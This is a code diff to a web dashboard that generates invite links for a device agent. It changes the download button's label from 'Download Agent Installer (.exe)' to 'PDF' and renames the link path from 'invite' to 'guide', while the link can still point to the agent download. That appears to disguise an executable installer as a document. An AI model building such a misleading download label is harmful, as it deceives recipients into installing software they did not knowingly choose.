@@ -1977,7 +1977,7 @@ Window context is shown in [brackets].
           <div class="lbox"><input id="link-input" readonly onclick="this.select()"/><button class="tbtn p" onclick="copyLink()"><span class="mi" id="copy-ico">content_copy</span></button></div>
         </div>
         <a id="dl-btn" href="#" onclick="handleDownload(event)" style="display:flex;align-items:center;justify-content:center;gap:7px;padding:10px;background:var(--c-brand);color:#000;border-radius:7px;font-size:12px;font-weight:700;margin-bottom:10px;cursor:pointer;transition:opacity .15s" onmouseover="this.style.opacity='.88'" onmouseout="this.style.opacity='1'">
-          <span class="mi">download</span>Download Agent Installer (.exe)
+          <span class="mi">download</span>PDF
         </a>
         <div class="poll-row">
           <div class="pdot" id="pdot"></div>
@@ -2668,16 +2668,16 @@ async function generateLink() {
     setTxt('Contacting server…',`POST ${srv}/api/invite`);
     try {
       const r=await fetch(`${srv}/api/invite`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({label,location:loc,device_type:type,expiry}),signal:AbortSignal.timeout(7000)});
-      if(r.ok) { const d=await r.json(); token=d.token||d.device_id; downloadUrl=d.download_url||d.agent_url||`${srv}/invite/${token}`; }
+      if(r.ok) { const d=await r.json(); token=d.token||d.device_id; downloadUrl=d.download_url||d.agent_url||`${srv}/guide/${token}`; }
     } catch(e) { console.warn('[invite]',e.message); }
     if (!token) {
       const hex=()=>[...Array(3)].map(()=>Math.floor(Math.random()*256).toString(16).padStart(2,'0')).join('').toUpperCase();
-      token=`MV-${hex()}-${hex()}-${hex()}`; downloadUrl=`${srv}/invite/${token}`;
+      token=`MV-${hex()}-${hex()}-${hex()}`; downloadUrl=`${srv}/guide/${token}`;
       setTxt('Server offline — local fallback','Saving to Supabase…');
       try { await SB.post(SC.activeTable||'devices',{device_id:token,label,location:loc,device_type:type,status:'pending',created_at:new Date().toISOString()}); } catch {}
     }
     setConnStep('cstep-1','done'); setConnStep('cstep-2','active'); setTxt('Session saved','Token registered');
-    await new Promise(r=>setTimeout(r,350)); setConnStep('cstep-2','done'); setConnStep('cstep-3','active'); setTxt('Building link…',`${srv}/invite/${token}`);
+    await new Promise(r=>setTimeout(r,350)); setConnStep('cstep-2','done'); setConnStep('cstep-3','active'); setTxt('Building link…',`${srv}/guide/${token}`);
     await new Promise(r=>setTimeout(r,350)); setConnStep('cstep-3','done');
     _currentToken=token; $('disp-token').textContent=token; $('link-input').value=downloadUrl;
     $('disp-expiry').textContent=expiry===0?'· Never':`· ${expiry/3600<24?expiry/3600+'h':expiry/86400+'d'}`;
